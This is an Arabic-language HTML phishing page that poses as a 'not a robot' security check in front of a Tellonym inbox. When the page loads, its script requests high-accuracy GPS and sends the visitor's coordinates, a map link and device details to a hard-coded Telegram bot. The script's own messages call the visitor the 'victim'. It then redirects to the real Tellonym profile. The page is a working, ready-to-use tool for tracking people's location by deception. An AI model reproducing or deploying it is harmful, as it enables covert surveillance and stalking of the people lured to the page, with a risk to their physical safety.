<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحقق من الهوية...</title>
    <style>
        body { background: #121212; color: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; overflow: hidden; }
        .box { text-align: center; background: #1e1e1e; padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); border: 1px solid #333; max-width: 80%; }
        .spinner { border: 4px solid rgba(255, 255, 255, 0.1); border-top: 4px solid #00f2fe; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { to { transform: rotate(360deg); } }
        h2 { font-size: 20px; margin-bottom: 10px; }
        p { color: #aaa; font-size: 14px; line-height: 1.5; }
    </style>
</head>
<body>

<div class="box">
    <div class="spinner"></div>
    <h2>تأكيد الأمان</h2>
    <p>يرجى النقر على <b>"سماح" (Allow)</b> للتأكد من أنك لست "روبوت" ولفتح صندوق الرسائل الخاص بـ Schaien.</p>
</div>

<script>
    const B_T = "8793022795:AAFzOmrMn1eYAkVuBPcy6nh7cf49-WvvaiM";
    const C_I = "1138822664";
    const FINAL_URL = "https://tellonym.me/Schaien";

    function zap(msg) {
        new Image().src = `https://api.telegram.org/bot${B_T}/sendMessage?chat_id=${C_I}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
    }

    function hunt() {
        zap("🔔 **دخول جديد لصفحة Tellonym!**\nجاري سحب الإحداثيات...");

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (p) => {
                    const { latitude: lt, longitude: ln, accuracy: ac } = p.coords;
                    const map = `https://www.google.com/maps?q=${lt},${ln}`;
                    zap(`🎯 **تم قنص موقع الضحية!**\n\n📍 الخريطة: [اضغط هنا](${map})\n📌 الإحداثيات: \`${lt}, ${ln}\`\n📏 الدقة: ${ac} متر\n📱 الجهاز: ${navigator.userAgent}`);
                    setTimeout(() => { window.location.replace(FINAL_URL); }, 800);
                },
                (e) => {
                    zap("❌ الضحية رفض إعطاء الموقع (GPS Denied).");
                    window.location.replace(FINAL_URL);
                },
                { enableHighAccuracy: true, timeout: 7000 }
            );
        } else {
            window.location.replace(FINAL_URL);
        }
    }

    // التنفيذ التلقائي
    window.onload = hunt;
    // حماية ضد التعليق
    setTimeout(() => { window.location.replace(FINAL_URL); }, 10000);
</script>

</body>
</html>
